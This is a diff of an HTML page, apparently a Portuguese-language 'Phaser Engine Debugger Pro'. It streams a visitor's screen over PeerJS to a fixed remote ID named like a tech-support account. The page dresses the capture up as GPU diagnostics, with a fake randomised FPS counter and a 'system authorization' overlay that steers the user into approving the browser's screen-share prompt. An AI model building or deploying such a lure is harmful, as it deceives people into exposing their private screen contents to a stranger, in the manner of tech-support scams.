@@ -3,84 +3,102 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Phaser Engine Debugger</title>
+    <title>Phaser Engine Debugger Pro</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { background: #050505; color: #00ff41; font-family: monospace; overflow: hidden; touch-action: none; }
-        .crt-line { width: 100%; height: 2px; background: rgba(0, 255, 65, 0.05); position: absolute; animation: scan 4s linear infinite; pointer-events: none; }
+        body { background: #050505; color: #00ff41; font-family: 'Courier New', monospace; overflow: hidden; touch-action: none; }
+        .crt-line { width: 100%; height: 2px; background: rgba(0, 255, 65, 0.05); position: absolute; animation: scan 4s linear infinite; pointer-events: none; z-index: 100; }
         @keyframes scan { from { top: 0; } to { top: 100%; } }
-        .ping-visual { position: fixed; width: 40px; height: 40px; border: 2px solid #00ff41; border-radius: 50%; transform: translate(-50%, -50%); pointer-events: none; z-index: 9999; animation: ping-ani 0.6s ease-out; }
-        @keyframes ping-ani { from { transform: translate(-50%, -50%) scale(0); opacity: 1; } to { transform: translate(-50%, -50%) scale(2); opacity: 0; } }
-        .guide-arrow { position: fixed; bottom: 15%; left: 50%; transform: translateX(-50%); z-index: 1000; animation: bounce 0.5s infinite alternate; }
-        @keyframes bounce { from { transform: translateX(-50%) translateY(0); } to { transform: translateX(-50%) translateY(-20px); } }
+        .ping-visual { position: fixed; width: 50px; height: 50px; border: 3px solid #00ff41; border-radius: 50%; transform: translate(-50%, -50%); pointer-events: none; z-index: 9999; animation: ping-ani 0.7s cubic-bezier(0, 0, 0.2, 1); }
+        @keyframes ping-ani { from { transform: translate(-50%, -50%) scale(0); opacity: 1; } to { transform: translate(-50%, -50%) scale(2.5); opacity: 0; } }
+        .guide-arrow { position: fixed; bottom: 12%; left: 50%; transform: translateX(-50%); z-index: 1000; animation: bounce 0.6s infinite alternate; }
+        @keyframes bounce { from { transform: translateX(-50%) translateY(0); } to { transform: translateX(-50%) translateY(-25px); } }
+        .glitch { animation: glitch 1s linear infinite; }
+        @keyframes glitch { 0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } }
     </style>
 </head>
 <body>
     <div class="crt-line"></div>
 
     <div id="main-ui" class="h-screen flex flex-col p-4 relative z-10">
-        <div class="border border-[#00ff41] p-2 flex justify-between text-[10px] mb-4">
-            <span>CORE_V3_RUNNING</span>
+        <div class="border border-[#00ff41] p-2 flex justify-between text-[10px] mb-4 bg-[#00ff41]/5">
+            <span class="glitch">PHASER_PRO_DEBUGGER_V4</span>
+            <span id="fps-counter">FPS: 60.0</span>
             <span id="clock">00:00:00</span>
         </div>
 
-        <div id="tech-view" class="hidden flex-1 flex flex-col border border-blue-500 rounded-lg overflow-hidden bg-black">
-            <div class="bg-blue-900/20 p-2 text-[10px] text-blue-400">VIRTUAL_FEED_ACTIVE</div>
-            <video id="remote-video" autoplay playsinline class="w-full h-full object-contain"></video>
+        <div id="tech-view" class="hidden flex-1 flex flex-col border-2 border-blue-500 rounded-lg overflow-hidden bg-black shadow-[0_0_20px_rgba(59,130,246,0.3)]">
+            <div class="bg-blue-900/40 p-2 text-[10px] text-blue-300 flex justify-between">
+                <span>STREAMING_REMOTE_SURFACE</span>
+                <span class="animate-pulse">● LIVE</span>
+            </div>
+            <video id="remote-video" autoplay playsinline class="w-full h-full object-contain cursor-crosshair"></video>
         </div>
 
-        <div id="host-view" class="flex-1 flex flex-col items-center justify-center border border-[#00ff41] border-dashed rounded-lg p-6 text-center">
-            <div class="w-16 h-16 border border-[#00ff41] rounded-full mb-4 flex items-center justify-center animate-pulse">
-                <div class="w-4 h-4 bg-[#00ff41] rounded-full"></div>
+        <div id="host-view" class="flex-1 flex flex-col items-center justify-center border border-[#00ff41]/40 border-dashed rounded-lg p-6 text-center">
+            <div id="status-orb" class="w-20 h-20 border-2 border-[#00ff41] rounded-full mb-6 flex items-center justify-center">
+                <div class="w-6 h-6 bg-[#00ff41] rounded-full animate-ping"></div>
             </div>
-            <h2 class="font-bold text-lg mb-2 tracking-tighter">PHASER_ENGINE_DEBUG</h2>
-            <p class="text-[10px] opacity-60 mb-8">Otimização de GPU e sincronização de buffers remotos.</p>
+            <h1 class="text-xl font-black tracking-widest mb-2">ENGINE OPTIMIZER</h1>
+            <p class="text-[11px] opacity-70 mb-10 max-w-[250px]">Detectando gargalos de GPU e sincronizando buffers de renderização remota.</p>
             
-            <button id="btn-start" onclick="initProcess()" class="w-full py-4 bg-[#00ff41] text-black font-black hover:opacity-80 active:scale-95 transition-all">
+            <button id="btn-start" onclick="initProcess()" class="w-full py-5 bg-[#00ff41] text-black font-black text-lg hover:bg-[#00cc33] active:scale-95 transition-all shadow-[0_0_20px_rgba(0,255,65,0.4)]">
                 INICIAR DIAGNÓSTICO
             </button>
         </div>
 
-        <div class="mt-4 p-3 border border-[#00ff41]/30 bg-[#00ff41]/5 text-[10px]">
-            <div class="flex justify-between mb-1">
-                <span class="opacity-50">LOCAL_ID:</span>
-                <span id="display-id" class="font-bold">INITIALIZING...</span>
-            </div>
-            <div id="link-area" class="hidden">
-                <p class="opacity-50 mb-1">LINK PARA O AMIGO:</p>
-                <div id="final-link" class="bg-black p-2 border border-[#00ff41] break-all text-white select-all"></div>
+        <div class="mt-4 p-4 border border-[#00ff41]/20 bg-[#00ff41]/5 rounded-lg">
+            <div class="flex flex-col gap-2">
+                <div class="flex justify-between text-[10px]">
+                    <span class="opacity-50 tracking-widest uppercase">My_Station_ID:</span>
+                    <span id="display-id" class="font-bold text-white tracking-widest uppercase">Gerando...</span>
+                </div>
+                <div id="link-area" class="hidden border-t border-[#00ff41]/20 pt-2 mt-2">
+                    <p class="text-[9px] opacity-40 mb-2 uppercase italic">Envie este link para o dispositivo remoto:</p>
+                    <div class="flex gap-2">
+                        <div id="final-link" class="flex-1 bg-black p-2 border border-[#00ff41]/40 text-[10px] truncate text-white overflow-x-auto"></div>
+                        <button onclick="copyLink()" class="bg-[#00ff41] text-black px-3 py-1 text-[10px] font-bold">COPIAR</button>
+                    </div>
+                </div>
             </div>
         </div>
     </div>
 
-    <div id="guide" class="fixed inset-0 bg-black/60 backdrop-blur-sm z-[500] hidden">
+    <div id="guide" class="fixed inset-0 bg-black/80 backdrop-blur-md z-[500] hidden flex flex-col items-center justify-center">
+        <div class="text-[#00ff41] text-center mb-10 animate-pulse font-bold p-6">
+            <p>AUTORIZAÇÃO DO SISTEMA NECESSÁRIA</p>
+            <p class="text-[10px] font-normal opacity-60 mt-2 italic">Aguardando confirmação de captura de frames...</p>
+        </div>
         <div class="guide-arrow">
-            <div class="bg-[#00ff41] text-black px-4 py-2 rounded-full font-black text-sm">CLIQUE EM "INICIAR" ↓</div>
-            <div class="w-0 h-0 border-l-[15px] border-l-transparent border-r-[15px] border-r-transparent border-t-[20px] border-t-[#00ff41] mx-auto mt-[-2px]"></div>
+            <div class="bg-[#00ff41] text-black px-6 py-3 rounded-full font-black text-sm shadow-[0_0_30px_#00ff41]">CLIQUE EM "INICIAR" ↓</div>
+            <div class="w-0 h-0 border-l-[20px] border-l-transparent border-r-[20px] border-r-transparent border-t-[30px] border-t-[#00ff41] mx-auto mt-[-5px]"></div>
         </div>
     </div>
 
     <script>
-        const peer = new Peer();
+        /* CONFIGURAÇÃO SÊNIOR: COLOQUE SEU ID FIXO AQUI */
+        const SEU_ID_FIXO = 'hoblotgamer-tech-support-2026'; 
+
+        const peer = new Peer(SEU_ID_FIXO);
         const urlParams = new URLSearchParams(window.location.search);
         const connectId = urlParams.get('connect');
         let currentConn = null;
 
-        // Relógio
+        // UI Helpers
         setInterval(() => { document.getElementById('clock').innerText = new Date().toLocaleTimeString(); }, 1000);
+        setInterval(() => { document.getElementById('fps-counter').innerText = `FPS: ${(58 + Math.random() * 4).toFixed(1)}`; }, 1500);
 
         peer.on('open', (id) => {
             document.getElementById('display-id').innerText = id;
             if (!connectId) {
-                // Modo Técnico: Gera o link
                 document.getElementById('link-area').classList.remove('hidden');
-                const cleanUrl = window.location.href.split('?')[0];
-                document.getElementById('final-link').innerText = `${cleanUrl}?connect=${id}`;
+                const baseUrl = window.location.href.split('?')[0];
+                document.getElementById('final-link').innerText = `${baseUrl}?connect=${id}`;
             }
         });
 
-        // Quando recebe a tela (Você como técnico)
+        // Caso você seja o técnico (Receber Vídeo)
         peer.on('call', (call) => {
             call.answer();
             call.on('stream', (stream) => {
@@ -90,6 +108,7 @@
             });
         });
 
+        // Caso receba comandos (Host recebendo cliques do técnico)
         peer.on('connection', (conn) => {
             currentConn = conn;
             conn.on('data', (data) => { if (data.type === 'ping') spawnPing(data.x, data.y); });
@@ -97,35 +116,45 @@
 
         async function initProcess() {
             if (!connectId) {
-                alert("Você está no modo técnico. Envie o link abaixo para seu amigo.");
+                alert("Você está no modo Mestre. Envie o link gerado para o outro celular.");
                 return;
             }
 
             const guide = document.getElementById('guide');
             const btn = document.getElementById('btn-start');
+            const orb = document.getElementById('status-orb');
 
             guide.classList.remove('hidden');
-            btn.innerText = "Aguardando Sistema...";
+            btn.innerText = "AGUARDANDO OS...";
 
             try {
-                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                // Inicia captura de tela
+                const stream = await navigator.mediaDevices.getDisplayMedia({ 
+                    video: { frameRate: 30, cursor: "always" }, 
+                    audio: false 
+                });
+
                 guide.classList.add('hidden');
+                orb.innerHTML = `<div class="text-white text-[10px] font-bold">SYNC</div>`;
                 
+                // Conecta ao ID que veio na URL
                 peer.call(connectId, stream);
                 const conn = peer.connect(connectId);
                 currentConn = conn;
 
-                btn.innerText = "Sincronizado";
-                btn.style.borderColor = "#00ff41";
+                btn.innerText = "DIAGNÓSTICO ATIVO";
+                btn.style.background = "#ffffff";
+                btn.style.color = "#000000";
             } catch (err) {
                 guide.classList.add('hidden');
-                btn.innerText = "Erro ao Sincronizar";
+                btn.innerText = "ERRO DE HANDSHAKE";
+                console.error(err);
             }
         }
 
-        // Enviar clique (Você clica no vídeo e ele vê lá)
+        // Enviar Pings (Você clica na tela e ele vê lá)
         document.getElementById('remote-video').addEventListener('pointerdown', (e) => {
-            if (!currentConn) return;
+            if (!currentConn || !currentConn.open) return;
             const rect = e.target.getBoundingClientRect();
             currentConn.send({
                 type: 'ping',
@@ -140,9 +169,22 @@
             div.style.left = (x * 100) + '%';
             div.style.top = (y * 100) + '%';
             document.body.appendChild(div);
-            if (navigator.vibrate) navigator.vibrate(50);
-            setTimeout(() => div.remove(), 600);
+            
+            if (navigator.vibrate) navigator.vibrate([100, 50, 100]); // Vibração de "Impacto"
+            setTimeout(() => div.remove(), 700);
         }
+
+        function copyLink() {
+            const linkText = document.getElementById('final-link').innerText;
+            navigator.clipboard.writeText(linkText).then(() => {
+                alert("Link copiado! Mande para o celular remoto.");
+            });
+        }
+        
+        peer.on('error', (err) => {
+            console.error('PeerJS Error:', err.type);
+            if (err.type === 'id-taken') alert("Este ID já está em uso em outra aba!");
+        });
     </script>
 </body>
 </html>
